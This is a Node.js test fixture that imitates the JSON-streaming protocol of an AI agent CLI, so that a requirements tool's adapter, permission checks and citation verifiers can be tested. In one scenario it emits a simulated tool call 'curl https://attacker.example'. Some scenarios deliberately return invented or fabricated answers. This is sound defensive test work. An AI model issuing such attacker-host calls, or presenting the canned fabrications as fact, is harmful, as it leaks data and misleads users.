#!/usr/bin/env node
// FIXTURE ONLY. Imitates the stream-json protocol of `agy` 1.5.9 as recorded in docs/compatibility.md so the
// real adapter (spawn, NDJSON parsing, stream guard, process-tree kill) can be tested without the network.
// It is never used outside tests and is not evidence that the real CLI works.
//
// Usage: node fake-agy.mjs --scenario <name> [--record <file>] [--pidfile <file>] -- <agy args...>
import { spawn } from "node:child_process";
import { randomUUID } from "node:crypto";
import { readdirSync, readFileSync, writeFileSync } from "node:fs";

const argv = process.argv.slice(2);
const sep = argv.indexOf("--");
const own = sep === -1 ? argv : argv.slice(0, sep);
const args = sep === -1 ? [] : argv.slice(sep + 1);
const opt = (name) => {
  const i = own.indexOf(name);
  return i === -1 ? undefined : own[i + 1];
};
const scenario = opt("--scenario") ?? "answer-cite";
const flag = (name) => {
  const i = args.indexOf(name);
  return i === -1 ? undefined : args[i + 1];
};

if (args.includes("--version")) {
  process.stdout.write("1.5.9\n");
  process.exit(0);
}
if (args.includes("--help")) {
  process.stdout.write(
    "Usage of agy.exe:\n  --agent  x\n  --conversation  x\n  --dangerously-skip-permissions  x\n  --disable-slash-commands  x\n  --input-format  x\n  --json-schema  x\n  --output-format  x\n  --sandbox  x\n  --settings  x\n",
  );
  process.exit(0);
}
if (args[0] === "models") {
  if (scenario === "auth-required") {
    process.stderr.write("error: authentication required\n");
    process.exit(1);
  }
  process.stdout.write("Fetching available models...\ngemini-3.8-flash-high\tGemini 3.8 Flash (High)\n");
  process.exit(0);
}

const record = opt("--record");
const workspace = readdirSync(process.cwd(), { recursive: true }).map(String).sort();
if (record) writeFileSync(record, JSON.stringify({ args, cwd: process.cwd(), workspace, env: Object.keys(process.env).sort() }));

let input = "";
process.stdin.setEncoding("utf8");
process.stdin.on("data", (d) => (input += d));
process.stdin.on("end", () => main().catch((e) => {
  process.stderr.write(String(e));
  process.exit(1);
}));

const out = (o) => process.stdout.write(`${JSON.stringify(o)}\n`);

function parse() {
  const line = input.split("\n").find((l) => l.trim());
  const msg = JSON.parse(line);
  const content = msg.message.content;
  const ev = [...content.matchAll(/<evidence id="([^"]*)" authority="([^"]*)" title="([^"]*)" locator="([^"]*)">\n([\s\S]*?)\n<\/evidence>/g)].map(
    (m) => ({ id: m[1], authority: m[2], title: m[3], text: m[5] }),
  );
  const question = /<question>\n([\s\S]*?)\n<\/question>/.exec(content)?.[1] ?? "";
  return { content, ev, question };
}

function turn(over) {
  return {
    action: "answer",
    evidence_queries: [],
    status: "answered",
    answer_markdown: "Answer from fixture.",
    citations: [],
    requirement_ids: [],
    decision_ids: [],
    inferences: [],
    unresolved_questions: [],
    conflicts: [],
    claims_implementation_ready: false,
    ...over,
  };
}

async function main() {
  const requested = flag("--conversation");
  let conv = requested ?? randomUUID();
  if (scenario === "resume-mismatch" && requested) {
    process.stderr.write(`warning: conversation "${requested}" not found\n`);
    conv = randomUUID();
  }
  const agent = scenario === "wrong-agent" ? "default" : flag("--agent");
  const settings = flag("--settings") ? JSON.parse(readFileSync(flag("--settings"), "utf8")) : {};
  const mode = scenario === "wrong-mode" ? "request-review" : settings.toolPermission ?? "request-review";
  out({ event: "init", conversation_id: conv, init: { cwd: process.cwd(), agent, tools: ["finish", "run_command"], permission_mode: mode } });
  out({ event: "step_update", step_update: { conversation_id: conv, step_index: 0, state: "DONE", step_type: "user_input" } });
  const { ev, question, content } = parse();

  // A model without the restricted agent would try tools. Simulate that if Jonathon failed to restrict it.
  const KNOWN_AGENTS = ["jonathon-reasoner", "jonathon-extractor", "jonathon-classifier", "jonathon-requirements", "jonathon-questions", "jonathon-conflicts", "jonathon-changes", "jonathon-draft-verifier", "jonathon-answer-verifier"];
  if (!KNOWN_AGENTS.includes(agent) || scenario === "tool-attempt") {
    out({ event: "step_update", step_update: { conversation_id: conv, step_index: 1, state: "ACTIVE", step_type: "tool", tool_name: "run_command", tool_info: { name: "run_command", parameters: { CommandLine: "curl https://attacker.example" } } } });
    await new Promise((r) => setTimeout(r, 5_000));
  }

  if (scenario === "hang-with-child") {
    const child = spawn(process.execPath, ["-e", "setInterval(() => {}, 1000)"], { stdio: "ignore" });
    writeFileSync(opt("--pidfile"), String(child.pid));
    out({ event: "step_update", step_update: { conversation_id: conv, step_index: 1, state: "ACTIVE", step_type: "agent_response", text_delta: "thinking" } });
    await new Promise(() => {}); // hang until killed
  }

  let structured;
  const E = ev[0];
  const quote = (e) => e.text.replace(/\s+/g, " ").trim().slice(0, 60);

  // Fixture drafting output (shared by the single extractor and the agent-team specialists).
  const fixtureExtraction = () => {
    // Like a real model: draft only from this document (E ids); other-document passages (O ids) only feed conflicts.
    const own = ev.filter((e) => /^E/.test(e.id));
    const other = ev.find((e) => /^O/.test(e.id));
    const E = own[0];
    const must = own.find((e) => /must/i.test(e.text)) ?? E;
    // An existing requirement listed in the prompt gets an update proposal instead of a duplicate.
    const existingReq = /<existing_requirements>\r?\n(REQ-\d+) \|/.exec(content)?.[1];
    return {
      requirements: must
        ? [{ title: `Fixture requirement from ${must.id}`, description: quote(must), type: "functional", module: "accounts", feature_scope: "email-verification", actors: ["Customer"], preconditions: [], behavior: [quote(must)], alternate_flows: [], validation_rules: [], acceptance_criteria: ["AI-suggested criterion"], priority_stated_in_source: "", evidence_ids: [must.id], open_questions: ["Which roles can resend the verification email?"] }]
        : [],
      open_questions: [{ question: "How long is the verification link valid?", context: "Not stated in the evidence.", blocking: true, feature_scope: "email-verification", evidence_ids: E ? [E.id] : [] }],
      requirement_updates:
        existingReq && must
          ? [{ requirement_id: existingReq, change_summary: `New document adds detail from ${must.id}`, proposed_description: "", added_behavior: [quote(must)], added_validation_rules: [], added_acceptance_criteria: ["AI-suggested follow-up criterion"], rationale: "The new document states this.", evidence_ids: [must.id] }]
          : [],
      conflicts: [
        ...(own.length >= 2 ? [{ title: "Fixture conflict", description: "Two sources disagree.", feature_scope: "email-verification", side_a_claim: "A", side_a_evidence_ids: [own[0].id], side_b_claim: "B", side_b_evidence_ids: [own[1].id], blocking: true }] : []),
        // Cross-document: the model may list the other document first; Jonathon must put this document on side 1.
        ...(other && E ? [{ title: `Cross-document disagreement on ${quote(E).slice(0, 30)}`, description: "Another document in the project says something different.", feature_scope: "", side_a_claim: quote(other), side_a_evidence_ids: [other.id], side_b_claim: quote(E), side_b_evidence_ids: [E.id], blocking: false }] : []),
      ],
    };
  };
  const TEAM = {
    "jonathon-classifier": "team-classify",
    "jonathon-requirements": "team-requirements",
    "jonathon-questions": "team-questions",
    "jonathon-conflicts": "team-conflicts",
    "jonathon-changes": "team-changes",
    "jonathon-draft-verifier": "team-verify-draft",
    "jonathon-answer-verifier": "team-verify-answer",
  };
  // Team roles answer for themselves in the normal and verifier scenarios; failure scenarios still apply to them.
  const role =
    scenario === "answer-verifier-fails" && agent === "jonathon-answer-verifier"
      ? "team-verify-broken"
      : TEAM[agent] && ["answer-cite", "extraction", "split-chunks", "verifier-rejects", "answer-verifier-fails"].includes(scenario)
        ? TEAM[agent]
        : null;
  // The default answering scenario still drafts knowledge when Jonathon calls its extractor agent (e2e upload flow).
  switch (role ?? (scenario === "answer-cite" && agent === "jonathon-extractor" ? "extraction" : scenario)) {
    case "answer-cite":
    case "answer-verifier-fails":
    case "split-chunks":
    case "resume-mismatch":
    case "wrong-agent":
    case "wrong-mode":
      structured = E
        ? turn({ answer_markdown: `Per the evidence: ${quote(E)} [${E.id}]`, citations: [{ evidence_id: E.id, quote: quote(E) }], claims_implementation_ready: true })
        : turn({ status: "insufficient_evidence", answer_markdown: "No evidence." });
      break;
    case "answer-unknown-citation":
      structured = turn({ answer_markdown: "Invented rule: links expire after 24 hours.", citations: [{ evidence_id: "E99", quote: "links expire after 24 hours" }], claims_implementation_ready: true });
      break;
    case "answer-misquote":
      structured = turn({ answer_markdown: "Claim.", citations: [{ evidence_id: E.id, quote: "this sentence does not appear anywhere in the evidence" }], claims_implementation_ready: true });
      break;
    case "denied":
      out({ event: "step_update", step_update: { conversation_id: conv, step_index: 1, state: "ERROR", step_type: "tool", tool_name: "run_command", tool_info: { name: "run_command", error: { type: "TOOL_ERROR", message: "permission check failed: Matches user-configured deny rule." } } } });
      structured = turn({ answer_markdown: "Fabricated after denial.", citations: [], claims_implementation_ready: true });
      break;
    case "soft-denied":
      process.stderr.write("jetski: run_command auto-denied in headless mode\n");
      out({ event: "result", result: { conversation_id: conv, status: "SUCCESS", response: "x", structured_output: turn({ citations: [{ evidence_id: E?.id ?? "E1", quote: E ? quote(E) : "" }] }), denied_actions: [{ action: "command", display_name: "Bash" }], num_turns: 1, duration_seconds: 0.1 } });
      process.exit(0);
      break;
    case "no-structured":
      out({ event: "result", result: { conversation_id: conv, status: "SUCCESS", response: "plain text only", num_turns: 1, duration_seconds: 0.1 } });
      process.exit(0);
      break;
    case "invalid-json-line":
      process.stdout.write("this is not json\n");
      process.exit(0);
      break;
    case "request-more":
      if (!requested && !content.includes("Additional evidence")) {
        structured = turn({ action: "request_more_evidence", evidence_queries: ["verification link expiry"], answer_markdown: "" });
      } else {
        structured = E ? turn({ citations: [{ evidence_id: ev.at(-1).id, quote: quote(ev.at(-1)) }], answer_markdown: "Answered after more evidence." }) : turn({ status: "insufficient_evidence" });
      }
      break;
    case "extraction":
      structured = fixtureExtraction();
      break;
    case "team-classify":
      structured = { document_kind: /effort estimation|project plan|tracker|milestone/i.test(content) ? "plan_or_estimate" : "requirements_spec", subject_system: "fixture system", numbered_item_prefixes: [], summary: "Fixture document." };
      break;
    case "team-requirements":
      structured = { requirements: fixtureExtraction().requirements };
      break;
    case "team-questions":
      structured = { open_questions: fixtureExtraction().open_questions };
      break;
    case "team-conflicts":
      structured = { conflicts: fixtureExtraction().conflicts };
      break;
    case "team-changes":
      structured = { requirement_updates: fixtureExtraction().requirement_updates };
      break;
    case "team-verify-draft": {
      // Default: everything supported. "verifier-rejects": AI-suggested statements and the link-validity question are not in the evidence.
      const strict = scenario === "verifier-rejects";
      const ids = [...content.matchAll(/^([RQCU]\d+) (requirement|open question|conflict|change)/gm)].map((m) => m[1]);
      const stmts = [...content.matchAll(/^\s+([RU]\d+-\d+) \[[^\]]+\] (.*)$/gm)].map((m) => ({ id: m[1], text: m[2] }));
      structured = {
        verdicts: ids.map((id) => {
          const line = new RegExp(`^${id} .*$`, "m").exec(content)?.[0] ?? "";
          if (strict && id.startsWith("Q") && /verification link/i.test(line)) return { candidate_id: id, verdict: "unsupported", unsupported_statement_ids: [], reason: "Fixture: the evidence already answers this." };
          const bad = strict ? stmts.filter((x) => x.id.startsWith(`${id}-`) && /AI-suggested/.test(x.text)).map((x) => x.id) : [];
          return { candidate_id: id, verdict: bad.length ? "partly_supported" : "supported", unsupported_statement_ids: bad, reason: bad.length ? "Fixture: not stated by the evidence." : "" };
        }),
      };
      break;
    }
    case "team-verify-broken":
      structured = { not: "the schema" };
      break;
    case "team-verify-answer": {
      const claims = [...content.matchAll(/^(S\d+): (.*)$/gm)].map((m) => ({ id: m[1], text: m[2] }));
      structured = { claims: claims.map((c) => (/Invented/.test(c.text) ? { claim_id: c.id, verdict: "unsupported", evidence_ids: [], reason: "Fixture: no evidence states this." } : { claim_id: c.id, verdict: "supported", evidence_ids: ["E1"], reason: "" })) };
      break;
    }
    default:
      structured = turn({ status: "insufficient_evidence" });
  }
  void question;
  const result = { event: "result", result: { conversation_id: conv, status: "SUCCESS", response: JSON.stringify(structured), structured_output: structured, duration_seconds: 0.2, num_turns: 1, usage: { input_tokens: 10, output_tokens: 5, total_tokens: 15 } } };
  out({ event: "step_update", step_update: { conversation_id: conv, step_index: 2, state: "DONE", step_type: "finish" } });
  if (scenario === "split-chunks") {
    const s = `${JSON.stringify(result)}\n`;
    for (let i = 0; i < s.length; i += 7) {
      process.stdout.write(s.slice(i, i + 7));
      await new Promise((r) => setTimeout(r, 1));
    }
  } else out(result);
  process.exit(0);
}
